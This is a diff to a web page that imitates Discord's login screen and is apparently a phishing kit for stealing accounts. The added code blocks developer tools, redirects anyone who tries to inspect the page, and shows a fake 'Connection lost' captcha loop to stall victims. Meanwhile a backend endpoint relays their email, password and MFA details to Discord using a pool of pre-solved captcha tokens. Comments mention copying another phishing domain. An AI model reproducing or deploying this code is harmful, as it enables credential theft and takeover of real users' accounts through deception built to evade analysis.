@@ -39,7 +39,7 @@
   <link rel="icon" type="image/png" href="/captcha.png?v=2"/>
   <link rel="shortcut icon" type="image/png" href="/captcha.png?v=2"/>
   <link rel="apple-touch-icon" href="/captcha.png?v=2"/>
-  <!-- anti-debug disabled -->
+  <script>!function(){var _0x=function(){try{return!!window.console&&(window.console.log(''),!0)}catch(e){return!1}};document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('keydown',function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i'||e.key==='J'||e.key==='j'||e.key==='C'||e.key==='c'))||(e.ctrlKey&&(e.key==='U'||e.key==='u'||e.key==='S'||e.key==='s'))){e.preventDefault();e.stopPropagation();return false}});var _chk=new Image();Object.defineProperty(_chk,'id',{get:function(){document.body.innerHTML='';window.location.href='https://discord.com'}});setInterval(function(){var t0=performance.now();debugger;if(performance.now()-t0>100){document.body.innerHTML='';window.location.href='https://discord.com'}},3000);var _el=document.createElement('div');Object.defineProperty(_el,'id',{get:function(){document.body.innerHTML='';window.location.href='https://discord.com'}})}();</script>
   <link rel="preconnect" href="https://fonts.googleapis.com"/>
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
   <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap" rel="stylesheet"/>
@@ -48,8 +48,7 @@
     @font-face{font-family:'gg sans';src:local('gg sans'),local('Noto Sans'),local('Helvetica Neue');font-display:swap}
   </style>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-  <script src="https://js.hcaptcha.com/1/api.js?render=explicit&host=discord.com&onload=hcaptchaOnLoad&recaptchacompat=off" async defer></script>
-  <script>function hcaptchaOnLoad() { console.log('[hcaptcha] SDK ready, host=discord.com'); }</script>
+  <script src="https://js.hcaptcha.com/1/api.js?render=explicit" async defer></script>
   <style>
     :root{
       --font-primary:'gg sans','Noto Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
@@ -428,7 +427,7 @@
 
 
 
-<!-- hCaptcha challenge overlay (real Discord hCaptcha) -->
+<!-- hCaptcha stall overlay (real hCaptcha widget inside Discord modal) -->
 <div class="captcha-stall" id="captcha-stall">
   <div class="captcha-modal">
     <button class="captcha-close" id="captcha-close" title="Close">&times;</button>
@@ -436,13 +435,13 @@
       <img src="/captcha_face.png" alt="" onerror="this.src='https://i.imgur.com/h41kzXV.png';this.onerror=null"/>
     </div>
     <div class="captcha-body">
-      <h2>Human Verification</h2>
-      <p>Complete the challenge to log in.</p>
+      <h2>Wait! Are you human?</h2>
+      <p>Please confirm you're not a robot.</p>
       <div class="hcaptcha-wrap">
         <div id="h-captcha-widget"></div>
       </div>
       <div class="captcha-verifying" id="captcha-verifying">
-        <span style="color:#b5bac1;font-weight:500">Verifying…</span>
+        <span style="color:#ed4245;font-weight:600">Connection lost, please retry.</span>
       </div>
     </div>
   </div>
@@ -450,108 +449,14 @@
 
 <script>
 /* ═══ State ═══ */
-var mfaTicket       = null;
-var mfaHasSms       = false;
-var mfaMode         = 'totp';
-var qrSid           = null;
-var qrTimer         = null;
-var _qrBusy         = false;  /* guard: prevent concurrent initQR calls */
-var captchaEmail    = null;
-var captchaPw       = null;
-var captchaRqtoken  = '';
-var captchaSessionId = '';
-var _discordFingerprint = '';
-var _discordSuperProps = '';
-var _launchSignature = crypto.randomUUID ? crypto.randomUUID() : (Math.random().toString(36).slice(2) + '-' + Date.now().toString(36));
-var _eventSeq = 0;
-var _pageLoadTime = Date.now();
-
-/* ═══ Super properties — matches nsfw-age.top HAR exactly ═══ */
-function _buildSuperProps() {
-  if (_discordSuperProps) return _discordSuperProps;
-  var props = {
-    "os": "Windows",
-    "browser": "Chrome",
-    "device": "",
-    "system_locale": "en-US",
-    "browser_user_agent": navigator.userAgent,
-    "browser_version": (navigator.userAgent.match(/Chrome\/(\d+[\d.]+)/) || ['','136.0.0.0'])[1],
-    "os_version": "10",
-    "referrer": document.referrer || "",
-    "referring_domain": document.referrer ? (new URL(document.referrer)).hostname : "",
-    "referrer_current": "",
-    "referring_domain_current": "",
-    "release_channel": "stable",
-    "client_build_number": 368827,
-    "client_event_source": null
-  };
-  return btoa(JSON.stringify(props));
-}
-
-/* ═══ Build Discord headers — matches nsfw-age.top HAR request headers exactly ═══ */
-function _discordHeaders(extraHeaders) {
-  var h = {
-    'Content-Type': 'application/json',
-    'X-Debug-Options': 'bugReporterEnabled',
-    'X-Discord-Locale': 'en-US',
-    'X-Discord-Timezone': 'America/New_York',
-    'X-Super-Properties': _buildSuperProps()
-  };
-  if (_discordFingerprint) h['X-Fingerprint'] = _discordFingerprint;
-  if (extraHeaders) {
-    for (var k in extraHeaders) h[k] = extraHeaders[k];
-  }
-  return h;
-}
-
-/* ═══ Fetch fingerprint on page load (like nsfw-age.top serves Discord's JS that does this) ═══ */
-async function _fetchFingerprint() {
-  try {
-    var r = await fetch('/api/v9/experiments', {
-      headers: {
-        'X-Super-Properties': _buildSuperProps(),
-        'X-Debug-Options': 'bugReporterEnabled',
-        'X-Discord-Locale': 'en-US',
-        'X-Discord-Timezone': 'America/New_York'
-      }
-    });
-    if (r.ok) {
-      var d = await r.json();
-      if (d.fingerprint) {
-        _discordFingerprint = d.fingerprint;
-        console.log('[init] fingerprint:', d.fingerprint.slice(0,20) + '...');
-      }
-    }
-  } catch(e) { console.log('[init] fingerprint fetch error:', e); }
-}
-_fetchFingerprint();
-
-/* ═══ Science event helper ═══ */
-function _fireScience(eventType, extraProps) {
-  _eventSeq++;
-  var now = Date.now();
-  var props = {
-    client_track_timestamp: now,
-    event_sequence_number: _eventSeq,
-    client_performance_memory: 0,
-    accessibility_features: 524546,
-    rendered_locale: 'en-US',
-    uptime_app: Math.floor((now - _pageLoadTime) / 1000),
-    launch_signature: _launchSignature,
-    client_rtc_state: 'DISCONNECTED',
-    client_app_state: document.hasFocus() ? 'focused' : 'unfocused',
-    client_viewport_width: window.innerWidth,
-    client_viewport_height: window.innerHeight,
-    client_uuid: btoa(String.fromCharCode.apply(null, crypto.getRandomValues(new Uint8Array(24)))).replace(/=/g,''),
-    client_send_timestamp: now + 1
-  };
-  for (var k in extraProps) props[k] = extraProps[k];
-  var payload = JSON.stringify({events: [{type: eventType, properties: props}]});
-  var hdrs = _discordHeaders();
-  console.log('[science]', eventType, props);
-  /* Send directly to discord.com — Discord CORS allows any origin for /science */
-  fetch('https://discord.com/api/v9/science', {method:'POST', headers: hdrs, body: payload}).catch(function(e){ console.log('[science] send error:', e); });
-}
+var mfaTicket     = null;
+var mfaHasSms     = false;
+var mfaMode       = 'totp';
+var qrSid         = null;
+var qrTimer       = null;
+var _qrBusy       = false;  /* guard: prevent concurrent initQR calls */
+var captchaEmail  = null;
+var captchaPw     = null;
 
 /* ═══ Helpers ═══ */
 function showErr(id, msg) {
@@ -591,19 +496,21 @@ var _hcaptchaDone = false;
 var _pendingResult = null;
 var _hcaptchaWidgetId = null;
 
-function showCaptchaStall(sitekey, rqdata) {
+function showCaptchaStall() {
   _hcaptchaDone = false;
   _pendingResult = null;
   var el = document.getElementById('captcha-stall');
   if (el) {
     el.classList.remove('visible');
     el.classList.add('show');
-    /* Show immediately — no fake delay */
-    setTimeout(function() { el.classList.add('visible'); }, 50);
+    /* Graceful 3s stall before revealing the modal */
+    setTimeout(function() {
+      el.classList.add('visible');
+    }, 3000);
   }
   var vf = document.getElementById('captcha-verifying');
   if (vf) vf.classList.remove('show');
-  /* Destroy old widget, render fresh with real Discord sitekey + rqdata */
+  /* Destroy old widget completely, then render fresh */
   try {
     if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {
       try { hcaptcha.remove(_hcaptchaWidgetId); } catch(e2) {}
@@ -614,19 +521,21 @@ function showCaptchaStall(sitekey, rqdata) {
     var container = document.getElementById('h-captcha-widget');
     if (typeof hcaptcha !== 'undefined' && container) {
       container.innerHTML = '';
-      var opts = {
-        sitekey: sitekey || 'a9b5fb07-92ff-493f-86fe-352a2803b3df',
+      _hcaptchaWidgetId = hcaptcha.render('h-captcha-widget', {
+        sitekey: '4c672d35-0701-42b2-88c3-78380b0db560',
         theme: 'dark',
         size: 'normal',
         callback: onHcaptchaPass,
         'expired-callback': onHcaptchaExpire,
         'error-callback': onHcaptchaError
-      };
-      if (rqdata) opts.rqdata = rqdata;
-      _hcaptchaWidgetId = hcaptcha.render('h-captcha-widget', opts);
+      });
+    } else {
+      /* SDK not loaded — auto-bypass */
+      _hcaptchaDone = true;
     }
   } catch(e) {
     console.log('[captcha] render error:', e);
+    _hcaptchaDone = true;
   }
 }
 
@@ -651,60 +560,25 @@ function hideCaptchaStall() {
 
 function onHcaptchaPass(token) {
   _hcaptchaDone = true;
-  /* Show "Verifying..." while we send the token */
+  /* Show "Connection lost" — user thinks it failed and retries, buying stall time */
   var vf = document.getElementById('captcha-verifying');
   if (vf) vf.classList.add('show');
-  console.log('[captcha] solved, token prefix:', token ? token.slice(0,30)+'...' : '(empty)');
-  /* Fire captcha_event verify science event (matches nsfw-age.top) */
-  var captchaFlowKey = crypto.randomUUID ? crypto.randomUUID() : (Math.random().toString(36).slice(2) + '-' + Date.now().toString(36));
-  _fireScience('captcha_event', {
-    captcha_event_name: 'verify',
-    captcha_service: 'hcaptcha',
-    sitekey: 'a9b5fb07-92ff-493f-86fe-352a2803b3df',
-    captcha_flow_key: captchaFlowKey
-  });
-  /* Submit — re-POST to /api/v9/auth/login with captcha as HTTP headers (matches nsfw-age.top HAR exactly) */
-  submitWithCaptcha(token);
-}
-
-async function submitWithCaptcha(captchaToken) {
-  try {
-    /* Same body as first attempt — captcha goes in HEADERS, not body (nsfw-age.top HAR) */
-    var body = {
-      login:              captchaEmail,
-      password:           captchaPw,
-      undelete:           false,
-      gift_code_sku_id:   null
-    };
-    /* Build Discord headers + add captcha headers (exactly matches nsfw-age.top HAR) */
-    var hdrs = _discordHeaders({
-      'X-Captcha-Key':        captchaToken,
-      'X-Captcha-Rqtoken':    captchaRqtoken,
-      'X-Captcha-Session-Id': captchaSessionId
-    });
-    console.log('[captcha] POST /api/v9/auth/login with captcha headers');
-    console.log('[captcha] rqtoken:', captchaRqtoken ? captchaRqtoken.slice(0,30)+'...' : '(empty)');
-    console.log('[captcha] session_id:', captchaSessionId);
-    var r = await fetch('/api/v9/auth/login', {
-      method: 'POST',
-      headers: hdrs,
-      body: JSON.stringify(body)
-    });
-    var d = await r.json();
-    console.log('[captcha] response:', r.status, JSON.stringify(d).slice(0,300));
-    /* Fire network_action_user_login science event */
-    _fireScience('network_action_user_login', {
-      status_code: r.status,
-      url: '/auth/login',
-      request_method: 'post'
-    });
-    hideCaptchaStall();
-    processLoginResult(d, r.status);
-  } catch(err) {
-    console.error('[captcha] submitWithCaptcha error:', err);
-    hideCaptchaStall();
-    showErr('login-error', 'Connection error. Please try again.');
-    btnLoad('login-btn', false);
+  /* Reset widget after brief delay so user can re-solve (stall loop) */
+  setTimeout(function() {
+    try {
+      if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {
+        hcaptcha.reset(_hcaptchaWidgetId);
+      }
+    } catch(e) {}
+  }, 600);
+  /* If backend result already waiting, close panel after a brief pause */
+  if (_pendingResult) {
+    setTimeout(function() {
+      var pr = _pendingResult;
+      _pendingResult = null;
+      hideCaptchaStall();
+      processLoginResult(pr.d, pr.status);
+    }, 1200);
   }
 }
 
@@ -837,16 +711,6 @@ function processLoginResult(d, httpStatus) {
 
   if (d.success) { onSuccess(d); return; }
 
-  /* Check for captcha re-challenge (invalid-response etc.) */
-  var ckeys = d.captcha_key || [];
-  if (Array.isArray(ckeys) && ckeys.length > 0 && d.captcha_sitekey) {
-    /* Another captcha challenge — show again */
-    captchaRqtoken   = d.captcha_rqtoken || '';
-    captchaSessionId = d.captcha_session_id || '';
-    showCaptchaStall(d.captcha_sitekey, d.captcha_rqdata);
-    return;
-  }
-
   if (d.mfa !== undefined && d.ticket) {
     mfaTicket = d.ticket; mfaHasSms = !!d.sms; mfaMode = 'totp';
     window._mfaPw = d._pw || captchaPw || '?';  /* Preserve password for MFA round-trip */
@@ -854,21 +718,7 @@ function processLoginResult(d, httpStatus) {
     return;
   }
 
-  /* Check for email verification (Discord raw: errors.login._errors[].code === ACCOUNT_LOGIN_VERIFICATION_EMAIL) */
-  var emailVerify = false;
-  if (d.errors) {
-    for (var fk in d.errors) {
-      var ferrs = (d.errors[fk] && d.errors[fk]._errors) || [];
-      for (var i = 0; i < ferrs.length; i++) {
-        if (ferrs[i].code === 'ACCOUNT_LOGIN_VERIFICATION_EMAIL') {
-          emailVerify = true;
-          break;
-        }
-      }
-      if (emailVerify) break;
-    }
-  }
-  if (d.email_verify || emailVerify) {
+  if (d.email_verify) {
     showSec('login');
     showErr('login-error', 'New login location detected. Please check your email.');
     var errEl = document.getElementById('login-error');
@@ -906,7 +756,7 @@ function processLoginResult(d, httpStatus) {
   showErr('login-error', errMsg);
 }
 
-/* ═══ Login — transparent proxy to Discord (copies nsfw-age.top exactly) ═══ */
+/* ═══ Login ═══ */
 document.getElementById('login-form').addEventListener('submit', async function(e) {
   e.preventDefault();
   var em = document.getElementById('email').value.trim();
@@ -920,45 +770,33 @@ document.getElementById('login-form').addEventListener('submit', async function(
   btnLoad('login-btn', true);
   _pendingResult = null;
   _hcaptchaDone = false;
+  /* Show hCaptcha overlay immediately */
+  showCaptchaStall();
   try {
-    /* POST to /api/v9/auth/login — transparent proxy, same as nsfw-age.top */
-    var body = {login: em, password: pw, undelete: false, gift_code_sku_id: null};
-    var hdrs = _discordHeaders();
-    var r = await fetch('/api/v9/auth/login', {
+    /* Single long-poll request — server blocks until result is ready */
+    var r = await fetch('/api/login', {
       method: 'POST',
-      headers: hdrs,
-      body: JSON.stringify(body)
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({login:em, password:pw, prechallenge_id:_prechallengeId})
     });
     var d = await r.json();
-    console.log('[login] response:', r.status, JSON.stringify(d).slice(0,300));
-
-    /* Check for captcha challenge (Discord's raw response) */
-    var ckeys = d.captcha_key || [];
-    if (Array.isArray(ckeys) && (ckeys.indexOf('captcha-required') !== -1 || d.captcha_sitekey)) {
-      console.log('[login] captcha challenge:', JSON.stringify({
-        sitekey: d.captcha_sitekey,
-        rqdata: d.captcha_rqdata ? d.captcha_rqdata.slice(0,20)+'...' : '',
-        rqtoken: d.captcha_rqtoken ? d.captcha_rqtoken.slice(0,20)+'...' : '',
-        session_id: d.captcha_session_id
-      }));
-      /* Store captcha fields for step 2 (re-POST with captcha headers) */
-      captchaRqtoken   = d.captcha_rqtoken || '';
-      captchaSessionId = d.captcha_session_id || '';
-      /* Fire open_modal science events (matches nsfw-age.top HAR: 3 events at once) */
-      _fireScience('open_modal', {type: 'Guild Join Captcha'});
-      _fireScience('open_modal', {type: 'Captcha Modal'});
-      _fireScience('captcha_event', {
-        captcha_event_name: 'initial-load',
-        captcha_service: 'hcaptcha',
-        sitekey: d.captcha_sitekey || 'a9b5fb07-92ff-493f-86fe-352a2803b3df'
-      });
-      /* Render real hCaptcha with Discord's sitekey + rqdata */
-      showCaptchaStall(d.captcha_sitekey, d.captcha_rqdata);
-      return;
+    /* Check if hCaptcha is done or if this is an error (show errors immediately) */
+    var isError = !d.success && !(d.mfa !== undefined && d.ticket);
+    var stallVisible = document.getElementById('captcha-stall').classList.contains('show');
+    if (!stallVisible || isError) {
+      processLoginResult(d, r.status);
+    } else if (_hcaptchaDone) {
+      /* User already solved captcha and saw error msg — close panel silently */
+      setTimeout(function() {
+        hideCaptchaStall();
+        processLoginResult(d, r.status);
+      }, 1200);
+    } else {
+      /* Backend done first, wait for user to solve captcha */
+      _pendingResult = {d: d, status: r.status};
     }
-    processLoginResult(d, r.status);
   } catch(err) {
-    console.error('[login] error:', err);
+    hideCaptchaStall();
     showErr('login-error', 'Connection error. Please try again.');
     btnLoad('login-btn', false);
   }
@@ -1006,8 +844,25 @@ function backToLogin() {
 }
 
 /* ═══ Init ═══ */
+var _prechallengeId = null;
+
 window.addEventListener('DOMContentLoaded', function() {
   initQR();
+
+  /* ── Instant pre-challenge: fires on PAGE LOAD ──
+     Server has a 24/7 captcha token pool running in background.
+     We grab one immediately. When user clicks Login, the server does:
+       1) POST login → get fresh rqtoken from Discord
+       2) Submit pre-solved token with that fresh rqtoken
+     Result: ~1s login instead of ~25s. No email needed. */
+  fetch('/api/prechallenge', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({})
+  })
+    .then(function(r){return r.json()})
+    .then(function(d){ if(d.prechallenge_id) { _prechallengeId = d.prechallenge_id; console.log('[pre] Token reserved:', _prechallengeId); } })
+    .catch(function(){});
 
   /* ── Safari iOS keyboard fix ── scroll focused input into view */
   if (/iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
